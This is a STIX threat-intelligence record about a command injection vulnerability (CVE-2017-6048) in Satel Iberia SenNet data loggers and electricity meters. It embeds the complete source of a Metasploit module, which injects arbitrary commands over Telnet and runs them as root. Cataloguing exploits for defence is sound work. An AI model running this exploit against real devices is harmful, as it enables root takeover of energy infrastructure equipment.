{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--df2a9d8b-02f5-4a9f-99f8-1643c51f266e",
    "created": "2024-08-14T16:26:40.466179Z",
    "modified": "2024-08-14T16:26:40.466183Z",
    "name": "Satel Iberia SenNet Data Logger and Electricity Meters Command Injection Vulnerability",
    "description": " This module exploits an OS Command Injection vulnerability in Satel Iberia SenNet Data Loggers & Electricity Meters to perform arbitrary command execution as 'root'.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/telnet/satel_cmd_exec.rb",
            "external_id": "satel_cmd_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://ipositivesecurity.com/2017/04/07/sennet-data-logger-appliances-and-electricity-meters-multiple-vulnerabilties/"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-17-131-02"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Telnet\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Satel Iberia SenNet Data Logger and Electricity Meters Command Injection Vulnerability',\n      'Description' => %q{\n        This module exploits an OS Command Injection vulnerability in Satel Iberia SenNet Data Loggers & Electricity Meters\n        to perform arbitrary command execution as 'root'.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2017-6048' ],\n          [ 'URL', 'https://ipositivesecurity.com/2017/04/07/sennet-data-logger-appliances-and-electricity-meters-multiple-vulnerabilties/' ],\n          [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-17-131-02' ]\n        ],\n      'Author' =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n      'DisclosureDate' => '2017-04-07',\n      'License' => MSF_LICENSE,\n      'DefaultOptions' => { 'VERBOSE' => true })\n      )\n\n    register_options(\n      [\n        Opt::RPORT(5000),\n        OptInt.new('TIMEOUT', [true, 'Timeout for the Telnet probe', 30]),\n        OptString.new('CMD', [true, 'Command(s) to run', 'id'])\n      ], self.class\n    )\n\n    deregister_options('USERNAME', 'PASSWORD')\n  end\n\n  def run_host(ip)\n    to = (datastore['TIMEOUT'].zero?) ? 30 : datastore['TIMEOUT']\n    begin\n      ::Timeout.timeout(to) do\n        command = datastore['CMD']\n        inject = \"$true; #{command}\"\n        res = connect\n\n        print_status(\"Sending command now - #{command}\")\n\n        sock.puts(inject)\n        data = sock.get_once(-1, to)\n        print_good(\"#{data}\")\n\n        loot_name = 'cmd-exec-log'\n        loot_type = 'text/plain'\n        loot_desc = 'Satel SenNet CMD Exec Dump'\n        p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc)\n        print_good(\"File saved in: #{p}\")\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} - Connection Failed...\")\n      return false\n    ensure\n      disconnect\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-04-07"
}